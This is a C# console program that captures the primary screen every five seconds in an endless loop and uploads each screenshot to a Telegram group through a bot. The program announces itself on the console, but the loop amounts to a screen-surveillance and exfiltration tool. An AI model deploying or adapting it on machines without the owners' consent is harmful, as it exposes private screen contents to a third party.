// See https://aka.ms/new-console-template for more information
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using System.Windows.Forms;

class Program
{
    private static readonly string botToken = "YOUR_BOT_TOKEN"; // 🔹 你的 Telegram 机器人 Token
    private static readonly long chatId = -1001234567890; // 🔹 你的 Telegram 群组 ID

    static async Task Main()
    {

        Console.WriteLine("Hello, World!");

        var botToken = readTxtFrmFile("tok.txt");
        var botClient = new TelegramBotClient(botToken);

        Console.WriteLine("开始截图，每 5 秒发送一次...");

        while (true)
        {
            string filePath = CaptureScreenshot();
            await SendToTelegram(botClient, filePath);
            Thread.Sleep(5000); // 每隔 5 秒执行一次
        }
    }

    // 截取屏幕截图并保存
    private static string CaptureScreenshot()
    {
        string filePath = Path.Combine(Path.GetTempPath(), $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");

          Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
          Graphics g = Graphics.FromImage(bmp);
        g.CopyFromScreen(0, 0, 0, 0, bmp.Size);

        bmp.Save(filePath, ImageFormat.Png);
        Console.WriteLine($"已保存截图: {filePath}");
        return filePath;
    }
    static string readTxtFrmFile(string filePath)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException($"文件未找到: {filePath}");

        return File.ReadAllText(filePath);
    }
    // 发送截图到 Telegram 群
    private static async Task SendToTelegram(TelegramBotClient botClient, string filePath)
    {
          var stream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
        var inputFile = InputFile.FromStream(stream, Path.GetFileName(filePath)); // ✅ 使用 InputFile 代替 InputOnlineFile
        await botClient.SendPhotoAsync(chatId, inputFile,null, "📸 截图时间：" + DateTime.Now);

      //  await botClient.SendPhotoAsync(chatId, inputOnlineFile, "📸 截图时间：" + DateTime.Now);
        Console.WriteLine("截图已发送到 Telegram 群。");
    }
}





